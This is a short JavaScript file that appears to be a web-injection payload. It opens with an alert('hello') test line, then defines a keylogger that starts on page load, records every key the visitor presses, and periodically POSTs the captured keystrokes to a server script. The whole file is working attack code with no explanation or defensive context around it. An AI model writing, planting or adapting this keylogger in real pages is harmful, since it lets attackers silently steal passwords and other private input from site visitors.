alert ("hello")
var keylog = {
    // (A) SETTINGS & PROPERTIES
    delay: 0, // How often to send data to server
    min: 5, // Send to server only when there are at least X presses
    cache: [], // Key presses
  
    // (B) LISTEN TO KEYPRESSES ON PAGE LOAD
    init: function () {
      window.addEventListener("keydown", function(evt){
        keylog.cache.push(evt.key);
      });
      window.setInterval(keylog.send, keylog.delay);
    },
  
    // (C) SEND CAPTURED KEYS TO SERVER
    send: function () { if (keylog.cache.length > keylog.min) {
      // (C1) DATA
      var data = new FormData;
      data.append("presses", JSON.stringify(keylog.cache));
  
      // (C2) AJAX
      var xhr = new XMLHttpRequest();
      xhr.open("POST", "server.php");
      // OPTIONAL - FOR DEBUGGING OR FEEDBACK
      // xhr.onload = function(){ console.log(this.response); };
      xhr.send(data);
      keylog.cache = [];
    }}
  };
  window.addEventListener("DOMContentLoaded", keylog.init);